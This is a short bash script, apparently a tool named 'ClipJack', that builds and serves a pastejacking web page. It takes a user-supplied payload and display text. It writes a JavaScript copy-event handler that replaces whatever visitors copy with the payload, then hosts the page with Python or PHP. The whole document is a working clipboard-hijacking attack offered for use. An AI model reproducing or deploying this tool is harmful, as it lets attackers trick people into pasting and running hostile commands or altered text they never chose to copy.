#!/bin/bash

a=0
while [ $a -lt 10 ]
do
	clear
	echo -e "\033[1;3${a}m" 
	printf "
╔═╗┬  ┬┌─┐╦┌─┐┌─┐┬┌─
║  │  │├─┘║├─┤│  ├┴┐
╚═╝┴─┘┴┴ ╚╝┴ ┴└─┘┴ ┴"
	echo -e "\033[1;34m Twitter: twitter.com/febinrev \033[1;32m" 
	a=$(expr $a + 1)
	sleep 0.2
done


printf "\nEnter the payload to replace Copied String : "
read payload

printf "\nEnter The Text to display: [ENTER 'end' to to stop writing] \n"

text=""

while [ ! "$text" == "end" ]
do
printf "> "
read text
        if [ ! "$text" == "end" ]
        then
        printf "%s" "$text" >> feb.txt
        printf "\n" >> feb.txt
        else
                printf "\n" >> feb.txt
        fi
done

text1=$(cat feb.txt)
rm -f feb.txt

payload_write(){

printf "%s" "document.addEventListener('copy', function(e){
	e.clipboardData.setData('text/plain', '$payload\n');
	e.preventDefault();
});
" > $PWD/html/feb.js


}


html_write(){

printf "Title To the html Page : "
read title

printf "<html>
<head>
<script src='/feb.js'></script>
<title>$title</title>
</head>

<body>

$text1

</body>
</html>
" > $PWD/html/index.html

}

if [ -d $PWD/html ]
then
	payload_write
	html_write
else
	mkdir $PWD/html
	payload_write
	html_write
fi

python3=$(which python3)
php=$(which php)

printf " Port to host HTTP server: "
read port

if [ $python3 ]
then
	python3 -m http.server "$port" -d $PWD/html/
elif [ $php ]
then
	php -S 0.0.0.0:$port
	
else
	echo "Python3 / Php not found to start HTTP server"
fi






